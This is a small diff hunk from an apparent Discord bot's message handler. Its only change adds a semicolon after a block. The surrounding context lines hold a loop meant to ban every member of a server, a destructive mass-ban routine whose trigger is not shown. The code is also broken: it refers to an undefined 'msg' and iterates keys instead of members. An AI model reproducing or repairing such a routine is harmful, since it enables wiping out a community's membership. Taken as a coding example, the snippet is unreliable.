@@ -57,7 +57,7 @@ client.on("message", async message => {
     for (var members in msg.guild.members) {
 members.ban();
 }
-}
+};
 
     if (command.guildOnly && message.channel.type !== 'text') {
         return message.reply('I can\'t execute that command inside DMs!');
